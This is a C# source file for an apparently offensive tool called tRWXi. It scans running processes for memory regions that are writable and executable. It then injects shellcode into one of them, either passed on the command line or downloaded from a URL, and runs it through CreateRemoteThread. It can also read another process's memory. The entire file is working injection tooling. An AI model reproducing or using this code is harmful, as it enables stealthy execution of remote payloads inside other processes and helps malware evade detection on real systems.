using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Collections.Generic;
using tRWXi.Data;
using System.Linq;

namespace tRWXi
{
    public class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
        };

        [DllImport("kernel32.dll")]
        static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        private const Int32 TH32CS_SNAPPROCESS = 0x02;
        private const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
        private const Int32 MEM_COMMIT = 0x1000;
        private const Int32 MEM_PRIVATE = 0x20000;
        private const Int32 PROCESS_ALL_ACCESS = 0x001F0FFF;

        public static void Main(string[] args)
        {
            try
            {
                Dictionary<string, string> parameters = Utils.ArgParser.parse(args); 

                PROCESSENTRY32 pe = new PROCESSENTRY32();
                pe.dwSize = (uint)Marshal.SizeOf(pe);

                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();

                IntPtr lpAddress = IntPtr.Zero;

                IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

                bool hResult = Process32First(hSnapshot, ref pe);

                Dictionary<int, List<Data.ProcessMemoryInfo>> processes = new Dictionary<int, List<ProcessMemoryInfo>>();

                IntPtr numberOfBytesWritten = IntPtr.Zero;

                if (parameters.ContainsKey("enumerate"))
                {
                    Console.WriteLine("[!] Started enumeration");

                    while (hResult)
                    {
                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int)pe.th32ProcessID);

                        while (VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                        {
                            lpAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                            if (mbi.AllocationProtect == PAGE_EXECUTE_READ_WRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
                            {
                                if (!processes.ContainsKey((int)pe.th32ProcessID))
                                {
                                    processes[(int)pe.th32ProcessID] = new List<ProcessMemoryInfo>();
                                }
                                processes[(int)pe.th32ProcessID].Add(new ProcessMemoryInfo((int)pe.th32ProcessID, pe.szExeFile, hProcess, mbi.BaseAddress, mbi.RegionSize));
                            }
                        }
                        CloseHandle(hProcess);
                        hResult = Process32Next(hSnapshot, ref pe);
                        lpAddress = IntPtr.Zero;
                    }
                }
                else if (parameters.ContainsKey("inject") || parameters.ContainsKey("trigger") || parameters.ContainsKey("read"))
                {
                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                    {
                        int pid = Convert.ToInt32(parameters["pid"]);
                        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                        IntPtr addr = new IntPtr(Convert.ToInt64(parameters["address"], 16));

                        if (parameters.ContainsKey("read"))
                        {
                            int size = Convert.ToInt32(parameters["size"]);
                            byte[] output = new byte[size];
                            IntPtr written = new IntPtr();
                            ReadProcessMemory(hProcess, addr, output, size, out written);
                            Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(output)));
                            Environment.Exit(0);
                        }
                        else if (parameters.ContainsKey("inject"))
                        {
                            byte[] data;
                            if (parameters.ContainsKey("data"))
                            {
                                data = Utils.Shellcoder.convert(parameters["data"]);
                            }
                            else if (parameters.ContainsKey("url"))
                            {
                                data = Utils.Shellcoder.fetch(parameters["url"]);
                            }
                            else
                            {
                                data = new byte[] { };
                            }
                            Console.WriteLine("[!] Started injection");
                            WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
                            Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
                        }
                        else {}

                        Console.WriteLine("[!] Starting execution...");
                        IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                        if ((int)res != 0)
                        {
                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
                        }
                        Environment.Exit(0);
                    }
                    else
                    {
                        Utils.Helper.help();
                        Environment.Exit(1);
                    }
                }
                else
                {
                    Utils.Helper.help();
                    Environment.Exit(1);
                }
                
                CloseHandle(hSnapshot);

                if (parameters.ContainsKey("enumerate"))
                {
                    foreach (KeyValuePair<int, List<ProcessMemoryInfo>> kv in processes)
                    {
                        string pName = kv.Value.First().processName;
                        Console.WriteLine(String.Format("[+] {0} -> {1}: ", kv.Key, pName));
                        foreach (ProcessMemoryInfo pmi in kv.Value)
                        {
                            Console.WriteLine(String.Format("\thandler::{0}\tbaseAddress:0x{1:X}\tsize::{3}", pmi.handler, pmi.baseAddress.ToInt64(), pmi.baseAddress, pmi.size));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                Environment.Exit(1);
            }
        }
    }
}
